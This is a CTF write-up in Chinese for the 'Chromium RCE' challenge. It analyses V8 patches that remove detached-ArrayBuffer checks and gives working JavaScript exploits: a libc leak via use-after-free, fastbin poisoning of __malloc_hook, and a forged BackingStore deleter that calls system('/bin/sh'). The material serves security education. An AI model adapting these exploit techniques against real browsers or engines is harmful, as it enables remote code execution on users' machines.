## Pwn

### Chromium RCE

`git checkout f7a1932ef928c190de32dd78246f75bd4ca8778b` 在 apply patch `patch -p1 < tctf.diff` 即可。

可以在 [Chromium Code Search](https://source.chromium.org/chromium/chromium/src/+/f7a1932ef928c190de32dd78246f75bd4ca8778b:v8/src/builtins/typed-array-set.tq) trace code，因為內部有做 cross reference，能夠加快瀏覽速度。

網址 format 為： `https://source.chromium.org/chromium/chromium/src/+/<commit hash>:v8/src/path/to/file`

```diff
diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
index b5c9dcb261..babe7da3f0 100644
--- a/src/builtins/typed-array-set.tq
+++ b/src/builtins/typed-array-set.tq
@@ -70,7 +70,7 @@ TypedArrayPrototypeSet(
     // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].
     // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError
     //   exception.
-    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
+    const utarget = %RawDownCast<AttachedJSTypedArray>(target);

     const overloadedArg = arguments[0];
     try {
@@ -86,8 +86,7 @@ TypedArrayPrototypeSet(
       // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].
       // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError
       //   exception.
-      const utypedArray =
-          typed_array::EnsureAttached(typedArray) otherwise IsDetached;
+      const utypedArray = %RawDownCast<AttachedJSTypedArray>(typedArray);

       TypedArrayPrototypeSetTypedArray(
           utarget, utypedArray, targetOffset, targetOffsetOverflowed)
```

第一部分的 patch 在 typed-array-set.tq，`typed_array::EnsureAttached` 為一個 macro，如下 ([src](https://source.chromium.org/chromium/chromium/src/+/f7a1932ef928c190de32dd78246f75bd4ca8778b:v8/src/builtins/typed-array.tq;l=168))：

```c
macro EnsureAttached(array: JSTypedArray): AttachedJSTypedArray
    labels Detached {
  if (IsDetachedBuffer(array.buffer)) goto Detached;
  return %RawDownCast<AttachedJSTypedArray>(array);
}
```

代表會先檢查 array buffer 是否已經 detached，若不是才會執行 `%RawDownCast<AttachedJSTypedArray>(array)`，而該 patch 代表 attach 時並不會檢查 buffer 是否處於 detach 的狀態，而是直接做後續的行為。

attach buffer 有幾種方法：

```js
let a = new ArrayBuffer(0x100); // new buffer
let b = new BigUint64Array(a); // attach to a
```

```js
let a = new BigUint64Array(0x100); // create 0x100 size buffer array
let b = new BigUint64Array(0x100); // create 0x100 size buffer array
b.set(a); // attach to a (share array buffer)
```

> typedarray.set(array[, offset])
> typedarray.set(typedarray[, offset])
>
> typedarray
> 	If the source array is a typed array, the two arrays may share the same underlying ArrayBuffer; the JavaScript engine will intelligently copy the source range of the buffer to the destination range.

說明如果如果來源是 **typedarray**，則 js engine 會將 source array 的值 copy 到 destination。



此題的 patch 只對 typed array 有效，第一種方式並不會受到影響。



```diff
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index 117df1cc52..9c6ca7275d 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -1339,9 +1339,9 @@ MaybeLocal<Context> Shell::CreateRealm(
     }
     delete[] old_realms;
   }
-  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
   Local<Context> context =
-      Context::New(isolate, nullptr, global_template, global_object);
+      Context::New(isolate, nullptr, ObjectTemplate::New(isolate),
+                   v8::MaybeLocal<Value>());
   DCHECK(!try_catch.HasCaught());
   if (context.IsEmpty()) return MaybeLocal<Context>();
   InitializeModuleEmbedderData(context);
@@ -2260,10 +2260,7 @@ void Shell::Initialize(Isolate* isolate, D8Console* console,
             v8::Isolate::kMessageLog);
   }

-  isolate->SetHostImportModuleDynamicallyCallback(
-      Shell::HostImportModuleDynamically);
-  isolate->SetHostInitializeImportMetaObjectCallback(
-      Shell::HostInitializeImportMetaObject);
+  // `import("xx")` is not allowed

 #ifdef V8_FUZZILLI
   // Let the parent process (Fuzzilli) know we are ready.
@@ -2285,9 +2282,9 @@ Local<Context> Shell::CreateEvaluationContext(Isolate* isolate) {
   // This needs to be a critical section since this is not thread-safe
   base::MutexGuard lock_guard(context_mutex_.Pointer());
   // Initialize the global objects
-  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
   EscapableHandleScope handle_scope(isolate);
-  Local<Context> context = Context::New(isolate, nullptr, global_template);
+  Local<Context> context = Context::New(isolate, nullptr,
+                                        ObjectTemplate::New(isolate));
   DCHECK(!context.IsEmpty());
   if (i::FLAG_perf_prof_annotate_wasm || i::FLAG_vtune_prof_annotate_wasm) {
     isolate->SetWasmLoadSourceMapCallback(ReadFile);
```

第二部分為 `Context::New` 使用的 patch，用 `ObjectTemplate::New(isolate)` 取代 `CreateGlobalTemplate(isolate)`，以及禁止使用  `import`。

```diff
diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h
index 3519599a88..f1ba0fb445 100644
--- a/src/parsing/parser-base.h
+++ b/src/parsing/parser-base.h
@@ -1907,10 +1907,8 @@ ParserBase<Impl>::ParsePrimaryExpression() {
       return ParseTemplateLiteral(impl()->NullExpression(), beg_pos, false);

     case Token::MOD:
-      if (flags().allow_natives_syntax() || extension_ != nullptr) {
-        return ParseV8Intrinsic();
-      }
-      break;
+      // Directly call %ArrayBufferDetach without `--allow-native-syntax` flag
+      return ParseV8Intrinsic();

     default:
       break;
diff --git a/src/parsing/parser.cc b/src/parsing/parser.cc
index 9577b37397..2206d250d7 100644
--- a/src/parsing/parser.cc
+++ b/src/parsing/parser.cc
@@ -357,6 +357,11 @@ Expression* Parser::NewV8Intrinsic(const AstRawString* name,
   const Runtime::Function* function =
       Runtime::FunctionForName(name->raw_data(), name->length());

+  // Only %ArrayBufferDetach allowed
+  if (function->function_id != Runtime::kArrayBufferDetach) {
+    return factory()->NewUndefinedLiteral(kNoSourcePosition);
+  }
+
   // Be more permissive when fuzzing. Intrinsics are not supported.
   if (FLAG_fuzzing) {
     return NewV8RuntimeFunctionForFuzzing(function, args, pos);
```

第三部分是對 parser 相關的 function 做 patch，允許在沒有 `--allow-natives-syntax` 的情況下執行 `%ArrayBufferDetach`，`%ArrayBufferDetach` 可以讓 Array buffer detach，detach 在此代表 `free()` 掉 backing_store pointer。而在 local 編譯 debug d8 時，可以先不 apply 第三部分的 patch。



由於第一部分的 patch 允許一個 typed array 去 attach 一個 detached 的 array，因此可以 leak 出 freed memory region 內的資料。先觀察 detach 的影響與行為：

```js
let a = new BigUint64Array(0x100);
let b = new BigUint64Array(0x100);
%DebugPrint(a);
%DebugPrint(a.buffer);
%ArrayBufferDetach(a.buffer);
%DebugPrint(a);
%DebugPrint(a.buffer);
```

debug output：

**一開始還沒 detach 時**

```
d8> %DebugPrint(a);
DebugPrint: 0x3ed5080c2ad9: [JSTypedArray]
 ...
 - buffer: 0x3ed5080c2aa1 <ArrayBuffer map = 0x3ed508281189>
 ...
 - data_ptr: 0x555555723a90
   - base_pointer: (nil)
   - external_pointer: 0x555555723a90
```

- `data_ptr` 指向放資料的 memory region

```
d8> %DebugPrint(a.buffer)
DebugPrint: 0x3ed5080c2aa1: [JSArrayBuffer]
 ...
 - backing_store: 0x555555723a90
 ...
 - detachable
```

- JSTypedArray 的 `data_ptr` 與  `JSArrayBuffer` 的 `backing_store` 指向同一處

**detach 後**

```
d8> %DebugPrint(a)
DebugPrint: 0x3ed5080c2ad9: [JSTypedArray]
 ...
 - data_ptr: 0x555555723a90
   - base_pointer: (nil)
   - external_pointer: 0x555555723a90
 - detached
 ...
```

- 多了 `detached` 的 mark

```
d8> %DebugPrint(a.buffer)
DebugPrint: 0x3ed5080c2aa1: [JSArrayBuffer]
 ...
 - backing_store: (nil)
 - byte_length: 0
 - detachable
 - detached
 ...
```

- `backing_store` 已經被清成 NULL，並且被 mark 成 detached

由於是使用 `%ArrayBufferDetach()` 來強制讓 typed array 的 array buffer 被 detach，因此看起來才會像是有一個 dangling pointer。

再來看看如果 attach 上一個 buffer 已經被 detach 的 typed array 會發生什麼事：

```js
let a = new BigUint64Array(0x100);
let b = new BigUint64Array(0x100);
%ArrayBufferDetach(a.buffer);
%DebugPrint(b);
%DebugPrint(b.buffer);
b.set(a);
%DebugPrint(b);
%DebugPrint(b.buffer);
```

**attach 前**

```
d8> %DebugPrint(b);
DebugPrint: 0x3ed5080c2b55: [JSTypedArray]
 ...
 - buffer: 0x3ed5080c2b1d <ArrayBuffer map = 0x3ed508281189>
 ...
 - data_ptr: 0x5555556ff2b0
   - base_pointer: (nil)
   - external_pointer: 0x5555556ff2b0
 ...
```

```
d8> %DebugPrint(b.buffer);
DebugPrint: 0x3ed5080c2b1d: [JSArrayBuffer]
 ...
 - backing_store: 0x5555556ff2b0
 ...
 - detachable
 ...
```

**attach 後**

```
d8> %DebugPrint(b);
DebugPrint: 0x3ed5080c2b55: [JSTypedArray]
 ...
 - buffer: 0x3ed5080c2b1d <ArrayBuffer map = 0x3ed508281189>
 ...
 - length: 256
 - data_ptr: 0x5555556ff2b0
   - base_pointer: (nil)
   - external_pointer: 0x5555556ff2b0
 - properties: 0x3ed5080406e9 <FixedArray[0]> {}
 - elements: 0x3ed5080411a9 <ByteArray[0]> {
         0-1: 140737275199888
         2-3: 93824994130560
           4: 1
           5: 69085369516929
           6: 93824994120984
           7: 1
           8: 69085294289282
           9: 93824994120952
          ...
         194-195: 140737275199120
     	 196-255: 0
 }
```

```
d8> %DebugPrint(b.buffer);
DebugPrint: 0x3ed5080c2b1d: [JSArrayBuffer]
 ...
 - backing_store: 0x5555556ff2b0
 - byte_length: 2048
 - detachable
 ...
```

看起來是從 a 的  `data_ptr` copy 256 個 elements 到 b 的 buffer (`0x5555556ff2b0`) 當中。

而因為 `JSArrayBuffer` 的 `backing_store` 指向的 memory region 是由 glibc 原生的 `malloc()` 所分配，以 `new BigUint64Array(0x100)` 為例子，會分配 8 * 0x100 也就是 0x800 大小的空間給 `backing_store`，因此在被 free 後會被放進 unsortbin，而 unsortbin 的 fd / bk 會指向下一個 chunk，最舊的一塊的 `bk` 會指向 main_arena。

leak libc POC：

```js
let a = new BigUint64Array(0x100);
let b = new BigUint64Array(0x100);
%ArrayBufferDetach(a.buffer);
b.set(a);
let libc = b[1] - 0x3ebca0n;
```

拿到 libc 後，由於能透過 `c.set(d)` 的方式做 UAF edit，因此就是利用 heap 做常見的打法，不過因為 `new ArrayBuffer()` 是用 `calloc()`，拿不到 tcache，因此只能用 fastbin poison 改寫 `__malloc_hook` 成 `realloc()` 來調整 stack，寫  `__realloc_hook`  成 one gadget，exploit 如下：

```js
let a = new BigUint64Array(0xaaa); 
let b = new BigUint64Array(0xaaa);
%ArrayBufferDetach(a.buffer);
b.set(a);
let libc = b[1] - 0x3ebca0n;
let _system = libc + 0x4f550n;
let __malloc_hook = libc + 0x3ebc30n;
let realloc = libc + 0x98d70n + 8n;
let og = libc + 0x4f432n;
console.log("libc: 0x" + libc.toString(16));

// one gadget list
let og_buf = new ArrayBuffer(0x10);
let og_ta = new Uint8Array(og_buf);
for (var i = 0n; i < 8n; i++)
    og_ta[i] = Number((og >> i*8n) & 0xffn);
for (var i = 0n; i < 8n; i++)
    og_ta[i + 8n] = Number((realloc >> i*8n) & 0xffn);

// fill tcache
// because array allocation use calloc()
let owo = []
for (var i = 0n; i < 0x8n; i++)
    owo.push(new ArrayBuffer(0x60));

let cc = new ArrayBuffer(0x60);
let c = new BigUint64Array(cc);
let dd = new ArrayBuffer(0x60);
let d = new BigUint64Array(dd);

d[0] = __malloc_hook - 0x23n;

for (var i = 0; i < 0x6; i++)
    %ArrayBufferDetach(owo[i]);

%ArrayBufferDetach(c.buffer);
c.set(d);
let dummy = new ArrayBuffer(0x60);
let malloc_hook = new ArrayBuffer(0x60);
let malloc_hook_ta = new Uint8Array(malloc_hook);

malloc_hook_ta.set(og_ta, 0xb);
```

另一種解法為讓 freed chunk 被其他 object 拿去用，這樣就能透過改寫 object member 做 exploit。

我們的目標為 `(v8::internal::BackingStore *)`，而 `BackingStore` (size: 0x30) 的結構如下：

```
$3 = {
  <v8::internal::BackingStoreBase> = {<No data fields>},
  members of v8::internal::BackingStore:
  buffer_start_ = 0x55555568e9a0, // 0x0 - 0x7
  byte_length_ = { // 0x8 - 0xf
    <std::__Cr::__atomic_base<unsigned long, true>> = {
      <std::__Cr::__atomic_base<unsigned long, false>> = {
        __a_ = {
          <std::__Cr::__cxx_atomic_base_impl<unsigned long>> = {
            __a_value = 21840
          }, <No data fields>}
      }, <No data fields>}, <No data fields>},
  byte_capacity_ = 21840, // 0x10 - 0x17
  type_specific_data_ = { // 0x18 - 0x1f + 0x20 - 0x27
    v8_api_array_buffer_allocator = 0x7fffffffe020,
    v8_api_array_buffer_allocator_shared = {
      __ptr_ = 0x7fffffffe020,
      __cntrl_ = 0x0
    },
    shared_wasm_memory_data = 0x7fffffffe020,
    deleter = {
      callback = 0x7fffffffe020,
      data = 0x0
    }
  },
  // 0x28 - 0x2f
  is_shared_ = false, // 0
  is_wasm_memory_ = false, // 1
  holds_shared_ptr_to_allocator_ = false, // 2
  free_on_destruct_ = true, // 3
  has_guard_regions_ = false, // 4 
  globally_registered_ = false, // 5
  custom_deleter_ = false, // 6
  empty_deleter_ = false // 7
}
```

- `buffer_start_` 指向的即是我們存放 data 的地方



可以看到在 `~BackingStore()` 當中，如果 `custom_deleter_` 為 true，則會透過自己的 deleter 執行 callback function：

```cpp
BackingStore::~BackingStore() {
  GlobalBackingStoreRegistry::Unregister(this);
  ...
  if (buffer_start_ == nullptr) {
    Clear();
    return;
  }
  ...
  if (custom_deleter_) {
    DCHECK(free_on_destruct_);
    TRACE_BS("BS:custome deleter bs=%p mem=%p (length=%zu, capacity=%zu)\n",
             this, buffer_start_, byte_length(), byte_capacity_);
    type_specific_data_.deleter.callback(buffer_start_, byte_length_,
                                         type_specific_data_.deleter.data);
    Clear();
    return;
  }
  ...
}
```

- 其中 `type_specific_data_` 為 `BackingStore` 的一個 member，其 union `deleter` 的結構為：

  ```cpp
    struct DeleterInfo {
      v8::BackingStore::DeleterCallback callback;
      void* data;
    };
  ```

  如果能更改此 `callback` 成 `system()`，並傳入 `buffer_start_` 為 `/bin/sh` ptr，即可執行 `system("/bin/sh")`

雖然我們 detach 了 `ArrayBuffer`，但是還是能透過 `ta.set()` 去更新內部的東西，並且 data memory region 也會被其他需要的 object 取得，因此如果可以控制  `ArrayBuffer` 跟 `BackingStore` 有 overlap，就能任意更改 `BackingStore` struct 內部的 member，也能控制 `buffer_start_` 以及 `type_specific_data_.deleter.callback`。

`BackingStore`  的大小為 0x30，如果我們 detach 的 `ArrayBuffer` 剛好也是 0x30，極有可能在幾次後從 fastbin / tcache 中拿到我們 detach 的 `ArrayBuffer`，而次數取決於 js engine 內部的操作，即使是執行 `%DebugPrint()` 也會造成影響。不過即使有變動，如果行為完全相同，基本上能讓 memory 的操作做到一樣，最後的 exploit 如下：

```js
let a = new BigUint64Array(0xaaa);
let b = new BigUint64Array(0xaaa);
%ArrayBufferDetach(a.buffer);
b.set(a);
let libc = b[1] - 0x3ebca0n;
let _system = libc + 0x4f550n;
let binsh = libc + 0x1b3e1an;
console.log("libc: 0x" + libc.toString(16));

let tmp = new ArrayBuffer(0x30);
let fake_obj = new BigUint64Array(tmp);
fake_obj[0] = binsh;
fake_obj[1] = 0x100n;
fake_obj[2] = 0x100n;
fake_obj[3] = _system;
fake_obj[4] = 0x0n;
fake_obj[5] = 0x48n;

let tmp2 = new ArrayBuffer(0x30);
let a2 = new BigUint64Array(tmp2);
%ArrayBufferDetach(a2.buffer); // 0x40 array buffer data chunk put into fastbin (0x590)
let dummy = new ArrayBuffer(0x200); // get dummy fastbin chunk (0x610)
let victim = new ArrayBuffer(0x200); // overlap with 0x30
a2.set(fake_obj);

%ArrayBufferDetach(victim);
```

使用下列的方式能夠拿 tcache 的 chunk：

```js
function malloc(size) {
    let a = {};
    a.length = size;
    return new Uint8Array(a);    
}
```

